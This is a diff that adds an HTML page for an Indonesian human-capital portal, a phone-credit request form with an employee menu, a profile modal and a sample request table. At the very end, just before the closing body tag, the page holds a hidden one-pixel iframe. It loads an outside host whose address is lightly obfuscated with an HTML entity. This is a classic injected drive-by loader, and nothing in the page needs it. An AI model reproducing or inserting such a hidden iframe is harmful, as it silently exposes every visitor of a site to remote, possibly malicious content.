@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html>
+<title>HC ONLINE</title>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="HC ONLINE">
+<meta name="author" content="L Efendi">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Raleway">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+<!-- Date Otomatis  -->
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-datetimepicker/4.17.47/css/bootstrap-datetimepicker.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.0/jquery.min.js"></script>
+
+	<style>
+		html,body,h1,h2,h3,h4,h5 {font-family: "Raleway", sans-serif}
+	</style>
+
+<body class="w3-light-grey">
+
+<!-- Top container -->
+	<div class="w3-bar w3-top w3-black w3-large" style="z-index:4">
+	  <button class="w3-bar-item w3-button w3-hide-large w3-hover-none w3-hover-text-light-grey" onclick="w3_open();"><i class="fa fa-bars"></i>  Menu</button>
+	  <span class="w3-bar-item w3-right">Employee information</span>
+	</div>
+
+<!-- Sidebar/menu -->
+<nav class="w3-sidebar w3-collapse w3-white w3-animate-left" style="z-index:3;width:300px;" id="mySidebar"><br>
+  <div class="w3-container w3-row">
+    <div class="w3-col s4">
+      <img src="/w3images/avatar2.png" class="w3-circle w3-margin-right" style="width:46px">
+    </div>
+    <div class="w3-col s8 w3-bar w3-display w3-container">
+      <span>Welcome, <strong> Name User</strong></span><br>	  
+		<button onclick="document.getElementById('user').style.display='block'" class="w3-button w3-white"><i class="fa fa-user"></i></button>
+    </div>
+  </div>
+  
+  
+ <!-- Menu Modal -->
+<div id="user" class="w3-modal">
+  <div class="w3-modal-content w3-animate-zoom">
+    <div class="w3-container w3-red w3-display-container">
+      <span onclick="document.getElementById('user').style.display='none'" class="w3-button w3-display-topright w3-large">x</span>
+      <h1><center>Welcome Team</center></h1>
+    </div>
+    <div class="w3-container">
+      <h5>NIK :<b>		</b></h5>
+      <h5>Nama Panggilan : <b>		</b></h5>
+      <h5>Tanggal Lahir : <b>		</b></h5>
+      <h5>Alamat Sekarang : <b>		</b></h5>
+      <h5>Kota Sekarang : <b>		</b></h5>	  
+      <h5>Handphone : <b>		</b></h5>
+	  <h5>Agama : <b>		</b></h5>
+      <h5>Status Nikah : <b>		</b></h5>
+      <h5>Pendidikan Terakhir : <b>		</b></h5>	  
+    </div>
+    <div class="w3-container w3-blue">
+      <h1><center>ID Identitas Karyawan</center></h1>
+    </div>
+    <div class="w3-container">
+      <h5>ID KTP :<b>		</b></h5>
+      <h5>ID NPWP :<b>		</b></h5>
+      <h5>ID BPJS Kesehatan :<b>		</b></h5>
+      <h5>ID BPJS Ketenagakerjaan :<b>		</b></h5>	 	  
+    </div> <br/>
+  </div>
+</div>
+
+<hr> 
+  <div class="w3-bar-block">
+    <a href="#" class="w3-bar-item w3-button w3-padding-16 w3-hide-large w3-dark-grey w3-hover-black" onclick="w3_close()" title="close menu"><i class="fa fa-remove fa-fw"></i>  Close Menu</a>
+    <a href="index.html" class="w3-bar-item w3-button w3-padding"> <h4><i class="fa fa-home fa-fw w3-xlarge"></i>  HOME</h4> </a>
+	<a href="masteradmin.html" class="w3-bar-item w3-button w3-padding"> <h4><i class="fa fa-eye fa-fw w3-xlarge"></i>  Master Admin</h4> </a>
+    <a href="datakaryawan.html" class="w3-bar-item w3-button w3-padding"> <h4><i class="fa fa-users fa-fw w3-xlarge"></i> Data Karyawan</h4> </a>
+    <a href="laporan.html" class="w3-bar-item w3-button w3-padding"> <h4><i class="fa fa-file-text-o fa-fw w3-xlarge"></i>  Laporan</h4> </a>
+    <a href="permintaan.html" class="w3-bar-item w3-button w3-padding w3-blue"> <h4><i class="fa fa-pencil-square-o fa-fw w3-xlarge"></i>  Permintaan</h4> </a>
+    <a href="cuti.html" class="w3-bar-item w3-button w3-padding"> <h4><i class="fa fa-calendar fa-fw w3-xlarge"></i>  Cuti</h4> </a>
+    <a href="ijin.html" class="w3-bar-item w3-button w3-padding"> <h4><i class="fa fa-check-square-o fa-fw w3-xlarge"></i>  Ijin</h4> </a>
+    <a href="lembur.html" class="w3-bar-item w3-button w3-padding"> <h4><i class="	fa fa-hourglass-half fa-fw w3-xlarge"></i>  Lembur</h4> </a>
+    <a href="login.html" class="w3-bar-item w3-button w3-padding"> <h4><i class="fa fa-history fa-fw w3-xlarge"></i>  Logout</h4> </a><br><br>
+  </div>
+</nav>
+
+
+<!-- Overlay effect when opening sidebar on small screens -->
+<div class="w3-overlay w3-hide-large w3-animate-opacity" onclick="w3_close()" style="cursor:pointer" title="close side menu" id="myOverlay"></div>
+
+<!-- !PAGE CONTENT! -->
+<div class="w3-main" style="margin-left:300px;margin-top:43px;">
+
+<!-- Header -->
+  <header class="w3-container" style="padding-top:22px">
+    <h4><b><i class="fa fa-users w3-xxlarge"></i> HC ONLINE</b></h4>
+  </header>
+
+<div class="w3-row-padding">	  
+	  <div class="w3-half" style="width:100%">
+		<form class="w3-container w3-card-4 w3-light-grey w3-text-blue w3-margin" id="myForm">
+		
+			<div class="w3-container w3-blue">
+				<h2 class="w3-center">Permintaan Pulsa</h2>
+			</div>	 
+
+			<div class="w3-row w3-section">
+			  <div class="w3-col" style="width:60px"><i class="w3-xxlarge fa fa-calendar"></i></div>
+				
+			  <div class="w3-half" style="width:21%">			
+					<div class='input-group date' id='datetimepicker2'>
+						<span class="input-group-addon">
+							<span class="glyphicon glyphicon-calendar"></span>
+						</span>
+						<input type='text' class="form-control" style="width:99%" placeholder="Tanggal permintaan" required>
+					</div>				 				 
+			  </div>							
+			</div>			
+			
+			<div class="w3-row w3-section">
+			  <div class="w3-col" style="width:60px"><i class="w3-xxlarge fa fa-list-ol"></i></div>
+				<div class="w3-rest">
+				  <input class="w3-input w3-border" style="width:22%;color:black" type="number" name="anaknomer" id="anak_nomer" placeholder="Nomer Handphone" required>
+				</div>
+			</div>							
+
+			<div class="w3-row w3-section">
+			  <div class="w3-col" style="width:60px"><i class="w3-xxlarge fa fa-check-square-o"></i></div>
+
+			  <div class="w3-half" style="width:10%">	  
+				  <input class="w3-radio" type="radio" name="perdana" value="xl" checked>
+				  <label>XL</label>
+			  </div>
+			  
+			  <div class="w3-half" style="width:10%">		  
+				  <input class="w3-radio" type="radio" name="perdana" value="Axis">
+				  <label>Axis</label>
+			  </div>
+
+			  <div class="w3-half" style="width:10%">	  
+				  <input class="w3-radio" type="radio" name="perdana" value="im3" >
+				  <label>IM3</label>
+			  </div>
+			  
+			  <div class="w3-half" style="width:10%">		  
+				  <input class="w3-radio" type="radio" name="perdana" value="simpati">
+				  <label>Simpati</label>
+			  </div>
+
+			  <div class="w3-half" style="width:10%">		  
+				  <input class="w3-radio" type="radio" name="perdana" value="smartfren">
+				  <label>Smartfren</label>
+			  </div>
+
+			  <div class="w3-half" style="width:10%">	  
+				  <input class="w3-radio" type="radio" name="perdana" value="as" >
+				  <label>As</label>
+			  </div>
+			  
+			  <div class="w3-half" style="width:10%">		  
+				  <input class="w3-radio" type="radio" name="perdana" value="3">
+				  <label>3</label>
+			  </div>
+
+			  <div class="w3-half" style="width:10%">	  
+				  <input class="w3-radio" type="radio" name="perdana" value="se">
+				  <label>SE</label>
+			  </div>
+			  
+			  <div class="w3-half" style="width:10%">		  
+				  <input class="w3-radio" type="radio" name="perdana" value="xln">
+				  <label>XLN</label>
+			  </div>			  
+			</div>	
+
+			<div class="w3-row w3-section">
+			  <div class="w3-col" style="width:60px"><i class="w3-xxlarge fa fa-asterisk"></i></div>
+				<div class="w3-rest">
+				  <input class="w3-input w3-border" style="width:22%;color:black" type="number" name="anaknomer" id="anak_nomer" placeholder="Nominal Pulsa" required>
+				</div>
+			</div>				
+			
+			<div class="w3-row w3-section">			  
+			  <div class="w3-half" style="width:10%">
+			    <button class="w3-button w3-red w3-round-xxlarge" style="width:70%">
+					<a href="#" style="color:white"> 						
+						Tambah		 
+					</a>				
+				</button> 		
+			  </div>
+
+			  <div class="w3-half" style="width:10%">
+			    <button class="w3-button w3-red w3-round-xxlarge" style="width:70%">
+					<a href="#" style="color:white"> 						
+						Ubah		 
+					</a>				
+				</button>				
+			  </div>
+			  
+			  <div class="w3-half" style="width:10%">
+			    <button class="w3-button w3-red w3-round-xxlarge" style="width:70%">
+					<a href="#" style="color:white"> 						
+						Hapus		 
+					</a>				
+				</button>				
+			  </div>	
+			  
+			 <div class="w3-half" style="width:10%">
+			    <button class="w3-button w3-red w3-round-xxlarge" style="width:70%" onclick="myFunction()" value="Reset form">
+					<a href="#" style="color:white"> 						
+						Batal		 
+					</a>				
+				</button>				
+			  </div>					
+			  
+			</div>	
+<br/>	
+		<div class="row">
+			<div class="col-lg-12">
+				<table class="table table-bordered table-hover ">
+					<thead class="text-center" style="color:black">
+					  <tr>
+						<th>NIK</th>
+						<th>Nama Karyawan</th>
+						<th>Tanggal Permintaan</th>
+						<th>Nomer Handphone</th>
+						<th>Provider</th>
+						<th>Nominal Pulsa</th>
+						<th>ACC Atasan</th>
+						<th>ACC HC</th>						
+					  </tr>
+					</thead>
+					<tbody style="color:black">
+						<tr>
+							<td>1700001</td>
+							<td>Maria Felician N</td>
+							<td>13/01/2017</td>
+							<td>081888777999</td>
+							<td>XL</td>
+							<td>200.000.</td>
+						</tr>
+					</tbody>
+					
+					<tbody style="color:black">
+						<tr>
+							<td>1700002</td>
+							<td>Diana</td>
+							<td>23/01/2017</td>
+							<td>083899444555</td>
+							<td>Axis</td>
+							<td>150.000.</td>
+						</tr>
+					</tbody>					
+				</table>
+			</div>
+		</div> 			
+		</form>
+
+<!-- Batal-Reset -->
+	<script>
+		function myFunction() {
+			document.getElementById("myForm").reset();
+		}
+	</script>
+	
+	  </div>
+</div>
+<br/><br/><br/><br/><br/><br/><br/><br/><br/><br/>
+
+<!-- Footer -->
+	  <footer class="w3-container w3-padding-16 w3-light-blue">
+		<h4><b>Human Capital ONLINE</b></h4>
+		Powered by <a href="http://www.matchadonline.com/" title="W3.CSS" target="_blank" class="w3-hover-opacity">Match Advertising</a> 2017 Support from Dept IT
+	  </footer>
+	  
+<!-- End page content --> 
+</div>
+
+<script>
+// Get the Sidebar
+	var mySidebar = document.getElementById("mySidebar");
+
+// Get the DIV with overlay effect
+	var overlayBg = document.getElementById("myOverlay");
+
+// Toggle between showing and hiding the sidebar, and add overlay effect
+	function w3_open() {
+		if (mySidebar.style.display === 'block') {
+			mySidebar.style.display = 'none';
+			overlayBg.style.display = "none";
+		} else {
+			mySidebar.style.display = 'block';
+			overlayBg.style.display = "block";
+		}
+	}
+
+// Close the sidebar with the close button
+	function w3_close() {
+		mySidebar.style.display = "none";
+		overlayBg.style.display = "none";
+	}
+</script>
+
+
+<!-- Date Otomatis -->
+		<script src="assets/js/moment.js"></script>
+		<script src="assets/js/bootstrap-datetimepicker.min.js"></script>
+		<script>
+		$(function () {
+					$('#datetimepicker1').datetimepicker({
+						//format: 'DD/MM/YYYY'
+						format: 'YYYY-MM-DD'
+					});         
+				});
+		$(function () {
+					$('#datetimepicker2').datetimepicker({
+						//format: 'DD/MM/YYYY'
+						format: 'YYYY-MM-DD'
+					});         
+				});
+		$(function () {
+				   $('#datetimepicker3').datetimepicker({
+						//format: 'DD/MM/YYYY'
+						format: 'YYYY-MM-DD'
+					});         
+				});
+		$(function () {
+				   $('#datetimepicker4').datetimepicker({
+						//format: 'DD/MM/YYYY'
+						format: 'YYYY-MM-DD'
+					});         
+				});
+		</script>
+
+
+
+<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
+</body>
+</html>
